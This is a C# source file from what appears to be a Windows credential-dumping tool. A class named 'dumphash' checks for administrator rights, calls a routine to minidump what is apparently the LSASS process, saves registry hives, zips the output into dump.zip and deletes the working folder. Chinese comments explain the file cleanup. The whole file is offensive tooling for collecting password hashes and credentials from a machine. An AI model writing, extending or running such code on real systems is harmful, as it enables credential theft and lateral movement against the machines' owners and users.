using System;
using System.IO;
using System.IO.Compression;

internal class dumphash
{
    public static string ResultPath = Path.Combine(System.Environment.CurrentDirectory, "Results");
    public static void dump()
    {
        string lsasspath;

        Privileges IsHighIntergrity = new Privileges();
        if (Privileges.IsHighIntegrity() == false)
        {
            Console.WriteLine("Need run as Administrator!");
        }
        else
        {
            if (Directory.Exists(ResultPath))
            {//do nothing
            }
            else
            {
                Directory.CreateDirectory(ResultPath);
            }
            DumpMemory MiniDump = new DumpMemory();
            lsasspath = DumpMemory.MiniDump();

            regSave SaveReg = new regSave();
            regSave.SaveReg();

            CompressFile();
        }




    }

    public static void CompressFile()
    {
        // 创建并添加被压缩文件
        string CurrentFilePath = System.Environment.CurrentDirectory;
        string zipFilePath = Path.Combine(CurrentFilePath, "dump.zip");
        try
        {
            System.IO.File.Delete(zipFilePath);
            ZipFile.CreateFromDirectory(@".\Results", zipFilePath);
            Console.WriteLine("Compress Results: {0}\\dump.zip", CurrentFilePath);
            DeleteDir(ResultPath);
        }
        catch (Exception ex)
        {
            Console.WriteLine(ex.Message.ToString());
        }
    }


    public static void DeleteDir(string file)
    {
        try
        {
            //去除文件夹和子文件的只读属性
            //去除文件夹的只读属性
            System.IO.DirectoryInfo fileInfo = new DirectoryInfo(file);
            fileInfo.Attributes = FileAttributes.Normal & FileAttributes.Directory;

            //去除文件的只读属性
            System.IO.File.SetAttributes(file, System.IO.FileAttributes.Normal);

            //判断文件夹是否还存在
            if (Directory.Exists(file))
            {
                foreach (string f in Directory.GetFileSystemEntries(file))
                {
                    if (File.Exists(f))
                    {
                        //如果有子文件删除文件
                        File.Delete(f);
                        //Console.WriteLine(f);
                    }
                    else
                    {
                        //循环递归删除子文件夹
                        DeleteDir(f);
                    }
                }

                //删除空文件夹
                Directory.Delete(file);
                //Console.WriteLine(file);
            }

        }
        catch (Exception ex) // 异常处理
        {
            Console.WriteLine(ex.Message.ToString());// 异常信息
        }
    }

}
